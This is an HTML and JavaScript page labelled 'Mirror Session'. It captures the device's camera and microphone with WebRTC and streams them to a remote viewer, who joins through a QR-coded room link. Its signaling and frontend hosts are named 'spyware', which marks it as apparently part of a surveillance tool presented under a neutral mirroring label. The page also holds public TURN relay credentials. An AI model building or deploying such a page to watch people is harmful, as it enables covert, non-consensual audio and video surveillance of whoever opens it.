<!DOCTYPE html>
<html>
<head>
  <title>Mirror Host</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <style>
    body { font-family: Arial; padding: 20px; }
    video { width: 90%; margin-top: 10px; border-radius: 10px; background: #000; }
    #qr { margin: 20px 0; }
  </style>
</head>
<body>

<h2>Mirror Session</h2>

<div id="qr"></div>
<p id="session"></p>

<video id="local" autoplay playsinline></video>

<script>
const signalingURL = "wss://spyware-pu8q.onrender.com";
const frontendURL = "https://spyware-topaz.vercel.app/mirror.html?room=";
const room = Math.random().toString(36).substring(2, 10);

document.getElementById("session").innerHTML = "Session ID: " + room;

// QR uses your Vercel domain
new QRCode(document.getElementById("qr"), {
    text: frontendURL + room,
    width: 240,
    height: 240
});

const ws = new WebSocket(signalingURL);

// FIX: NAT-friendly STUN + TURN
const pc = new RTCPeerConnection({
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    {
      urls: "turn:openrelay.metered.ca:443",
      username: "openrelayproject",
      credential: "openrelayproject"
    }
  ]
});

ws.onopen = () => {
  ws.send(JSON.stringify({ type: "join", room }));
};

pc.onicecandidate = e => {
  if (e.candidate) {
    ws.send(JSON.stringify({ type: "ice", candidate: e.candidate }));
  }
};

navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then(stream => {
    document.getElementById("local").srcObject = stream;
    stream.getTracks().forEach(t => pc.addTrack(t, stream));
    return pc.createOffer();
  })
  .then(offer => {
    pc.setLocalDescription(offer);
    ws.send(JSON.stringify({ type: "offer", offer }));
  });

ws.onmessage = async (evt) => {
  const data = JSON.parse(evt.data);

  if (data.type === "answer") {
    await pc.setRemoteDescription(data.answer);
  }

  if (data.type === "ice") {
    await pc.addIceCandidate(data.candidate).catch(console.warn);
  }
};
</script>

</body>
</html>
